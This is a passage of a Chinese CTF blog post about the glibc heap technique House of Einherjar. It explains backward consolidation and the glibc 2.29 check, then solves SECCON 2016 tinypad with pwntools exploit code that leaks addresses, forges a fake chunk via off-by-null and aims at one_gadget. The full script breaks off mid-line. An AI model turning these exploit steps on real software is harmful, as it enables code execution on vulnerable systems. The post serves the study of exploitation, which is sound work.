<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>how2heap | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hoe2heap!!">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap">
<meta property="og:url" content="https://ixout.github.io/posts/49295/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="hoe2heap!!">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cfcb137bbbe3415.jpg">
<meta property="article:published_time" content="2023-08-19T09:34:54.000Z">
<meta property="article:modified_time" content="2023-11-20T13:58:46.954Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="how2heap">
<meta property="article:tag" content="heap">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cfcb137bbbe3415.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/posts/49295/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: true,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'how2heap',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-20 21:58:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
setTimeout(function(){preloader.endLoading();}, 7000);

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">46</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cfcb137bbbe3415.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">how2heap</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-19T09:34:54.000Z" title="发表于 2023-08-19 17:34:54">2023-08-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-20T13:58:46.954Z" title="更新于 2023-11-20 21:58:46">2023-11-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">16.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>71分钟</span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>house of einherjar 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（<strong>合并低地址的 chunk</strong>），从而使得尽可能避免碎片化。</p>
<p><strong>利用条件:</strong>off-by-one(可写下一chunk的prev_size与prev_inuse位)</p>
<p><strong>利用效果:</strong>得到一个几乎可以指向任何位置的chunk(要本身可写可控)</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>free函数向低地址chunk合并的操作如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>假设在内存由低到高有A与B两个chunk</p>
<p>且A能够改写B的prev_size与prev_inuse位</p>
<p><strong>unlink的chunk地址由以下代码决定</strong></p>
<p><code>p = chunk_at_offset(p, -((long) prevsize));</code></p>
<p>因为prevsize(<strong>有符号数</strong>)也是可控的</p>
<p>因此只需要在目标地址伪造fakechunk绕过unlink的检查即可</p>
<p><strong>完整性检查</strong>:难以找到存储&amp;A的内存,故选择fakechunk-&gt;fd=fakechunk-&gt;bk=fakechunk</p>
<p><strong>size检查:</strong>通过fakechunk的size字段找到的nextchunk的prev_size字段是否等于fakechunk的size</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png" alt=""></p>
<p>这样最后就能在unsortedbin中放入一个任意位置的chunk</p>
<p>不过这个chunk的size大概率无法通过unsorted取出时的检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);</span><br></pre></td></tr></table></figure>
<p>因此还需要再次写这个chunk的size为一个合适且合法的值</p>
<h2 id="2-29新限制"><a href="#2-29新限制" class="headerlink" title="2.29新限制"></a>2.29新限制</h2><p>2.29向低地址合并操作代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现多了一个检测(通过prevsize找到的chunk的size<strong>?=</strong>prevsize)</p>
<p>这就使得fakechunk的size必须和prevsize相同,而这样的话fakechunk的nextchunk必然还是原本的chunk,这样常常会使得fakechunk的size过大,从而被视作largebin进而会多出一些操作</p>
<p>因此,2.29及以后fakechunk的size字段必须和本chunk的prevsize相同</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><strong>2016 Seccon tinypad</strong></p>
<p>保护pie没开</p>
<p>漏洞有off_by_null</p>
<p>个人第一想法其实是:没开pie且数据段上存放指针—-&gt;可以打unlink</p>
<p>写hook执行system(‘/bin/sh’)或onegadget</p>
<p>exp都快写好了,才发现一个致命的点———-写的时候长度是由strlen定的,malloc_hook默认是null,也就是说就算指向了malloc_hook也写不了</p>
<p>于是只能学习ctfwiki的做法了(其实如果按以上想法做根本就没用到house of einherjar的知识)</p>
<p>思路如下:</p>
<p>常规泄露heap地址,libc地址;并以此得到heap与tinypad的偏移,environ的符号地址,one_gadget等等</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">tinypad=<span class="number">0x602040</span></span><br><span class="line">prev_size=heap_addr-<span class="number">0x602040</span></span><br><span class="line">environ=libc.symbols[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">one_gadget=libc.address+<span class="number">0x45226</span></span><br></pre></td></tr></table></figure>
<p>先申请四个chunk</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x11</span>))<span class="comment">#!!!</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br></pre></td></tr></table></figure>
<p>其中chunk2之所以要在尾部写p64(0x11))</p>
<p>是因为chunk2将用以free触发unlink,其后又会检测chunk2下一chunk的prev_inuse状态,写p64(0x11))用于off_by_null将chunk2的size改为0x100后继续维持后续chunk正常被寻找</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span>+p64(prev_size))</span><br><span class="line">fakechunk=<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(tinypad+<span class="number">0x20</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>)<span class="comment">#!!!</span></span><br><span class="line">edit(<span class="number">3</span>,fakechunk)</span><br></pre></td></tr></table></figure>
<p>释放chunk1再重新分配以off_by_null写chunk2的size和prev_size</p>
<p>并将fakechunk写在tinypad上,注意绕过unlink检查(自己做的时候这里犯了个蠢,fake_size用偏移offset填充,使得通过size找到的chunk为chunk2,这样是能够绕过部分检查,但offset的大小使得chunk被视作largebin从而unlink多了一部分检查nextsize链,而我又没填充nextsize域)</p>
<p><code>delete(2)</code>删除chunk2触发unlink使得tinypad被联入unsortedbin</p>
<p>此时fakechunk的大小显然不合规</p>
<p>于是</p>
<p><code>edit(4,b&#39;4&#39;*0x20+p64(0)+p64(0x101)+p64(libc.symbols[&#39;__malloc_hook&#39;]+0x10+0x58)*2)</code></p>
<p>将fakechunk的size改为能适中的大小</p>
<p>之后<code>add(0xf0,b&#39;2&#39;*0xd0+p64(666)+p64(environ)+b&#39;a&#39;*8+p64(0x602148))</code>将其申请出来并写memo1和memo2的指针</p>
<p>以此写main的返回地址</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./tinypad&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.sendline(<span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">	p.sendline(<span class="string">b&#x27;Q&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;2&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	p.recv()</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Deleted.&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">	<span class="comment">#debug()</span></span><br><span class="line">	heap_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x120</span></span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;CONTENT: 